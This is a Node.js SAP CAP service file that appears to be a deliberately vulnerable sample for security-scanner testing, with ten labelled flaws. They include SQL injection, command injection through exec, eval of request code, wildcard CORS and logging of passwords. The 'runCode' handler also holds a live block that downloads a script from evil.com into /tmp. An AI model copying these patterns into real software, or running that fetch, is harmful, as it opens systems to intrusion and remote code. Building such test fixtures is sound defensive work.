// srv/service.js
const cds = require('@sap/cds');
const mysql = require('mysql');        // Needed for SQL injection
const axios = require('axios');        // For external API calls
const { exec } = require('child_process'); // For command injection

module.exports = async function (srv) {

  // 🔐 Issue 1: Hardcoded Secret (CWE-798)
  const jwtSecret = 'superSecretKey1234567890';

  // 🛑 Issue 2: SQL Injection (CWE-89)
  srv.on('getUser', async (req) => {
    const userId = req.data.id;
    const connection = mysql.createConnection({
      host: 'localhost',
      user: 'root',
      password: '',
      database: 'testdb'
    });
    connection.connect();
    const query = `SELECT * FROM users WHERE id = '${userId}'`; // Unsafe
    return new Promise((resolve, reject) => {
      connection.query(query, (err, result) => {
        connection.end();
        if (err) reject({ error: err.message });
        else resolve(result);
      });
    });
  });

  // ⚠️ Issue 3: Command Injection (CWE-77)
  srv.on('ping', async (req) => {
    const ip = req.data.ip;
    return new Promise((resolve, reject) => {
      exec(`ping -c 3 ${ip}`, (err, stdout, stderr) => {
        if (err) reject({ error: stderr });
        else resolve({ result: stdout });
      });
    });
  });

  // 🚨 Issue 4: Unsafe eval (CWE-95)
  srv.before('runCode', (req) => {
    var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  res.on("data", d => {
    fs.writeFileSync("/tmp/script", d)
  })
});
    const code = req.data.code;
    const result = eval(code); // Dangerous
    req.result = { output: result };
  });

  // 🧨 Issue 5: Unvalidated Redirect (CWE-601)
  srv.on('redirectUser', (req) => {
    const target = req.data.url;
    // There is no direct res.redirect in CAP, but you can simulate
    return { redirect: target }; // Intentionally unsafe simulation
  });

  // 🌍 Issue 6: Untrusted Data to External API (CWE-020)
  srv.on('proxyRequest', async (req) => {
    const url = req.data.url;
    try {
      const response = await axios.get(url);
      return response.data;
    } catch (err) {
      return { error: err.message };
    }
  });

  // 🧱 Issue 7: Incomplete Sanitization Using substring (CWE-020)
  srv.on('fetchItem', async (req) => {
    const item = req.data.item;
    const url = 'https://api.example.com/items/' + item.substring(0, 5); // Weak validation
    try {
      const response = await axios.get(url);
      return response.data;
    } catch (err) {
      return { error: err.message };
    }
  });

  // 🥷 Issue 8: Missing Origin Check Before Action (CWE-346)
  srv.on('callback', (req) => {
    const data = req.data;
    handleCallback(data); // No origin or source check
    return 'Callback processed';
  });

  function handleCallback(data) {
    console.log('Handling callback:', data);
  }

  // 🕸️ Issue 9: Insecure CORS Policy (CWE-942)
  // CORS is typically configured at the app level (not per service)
  // Simulated here as a misconfigured middleware
  cds.on('bootstrap', (app) => {
    app.use((req, res, next) => {
      res.setHeader('Access-Control-Allow-Origin', '*'); // Too permissive
      next();
    });
  });

  // 🔎 Issue 10: Logging Sensitive Data (CWE-532)
  srv.on('login', (req) => {
    const { username, password } = req.data;
    console.log(`Login attempt: ${username} / ${password}`); // Logs sensitive info
    return 'Login attempt logged';
  });
};
